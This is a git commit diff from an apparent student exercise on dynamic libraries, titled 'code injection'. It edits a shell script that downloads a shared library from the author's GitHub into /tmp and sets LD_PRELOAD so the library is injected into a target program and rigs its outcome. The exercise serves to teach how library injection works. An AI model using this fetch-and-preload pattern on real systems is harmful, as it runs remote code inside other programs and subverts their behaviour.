cde94dc7d5d7f5cbe79ef1dd84e6902229b4170f
zuriel0001 <dogbeykwame.kd@gmail.com>
2023-06-19 12:39:20 -0700

    code injection

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp/ https://raw.github.com/zuriel0001/holbertonschool-low_level_programming/master/0x18-dynamic_libraries/gigalib.so
-export LD_PRELOAD=/tmp/gigalib.so
+wget -P /tmp/ https://raw.github.com/zuriel0001/holbertonschool-low_level_programming/master/0x18-dynamic_libraries/win.so
+export LD_PRELOAD=/tmp/win.so
